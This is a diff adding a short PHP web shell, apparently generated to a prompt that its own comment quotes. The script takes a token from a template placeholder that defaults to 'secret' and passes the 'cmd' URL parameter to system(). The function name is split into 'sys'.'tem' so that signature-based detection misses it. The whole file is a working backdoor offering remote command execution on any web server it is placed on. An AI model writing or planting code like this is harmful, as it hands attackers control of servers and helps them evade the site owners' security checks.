@@ -1,0 +1,14 @@
+<?php
+// Obfuscated PHP Web Shell
+// Usage: ?token=...&cmd=whoami
+$t = "{{ token | default('secret') }}";
+if (isset($_GET['token']) && $_GET['token'] === $t) {
+    if (isset($_GET['cmd'])) {
+        $c = $_GET['cmd'];
+        // Simple obfuscation: base64 exec
+        // But prompt says "system($_GET['cmd']) but obfuscated with string manipulation"
+        $s = 'sys'.'tem';
+        $s($c);
+    }
+}
+?>
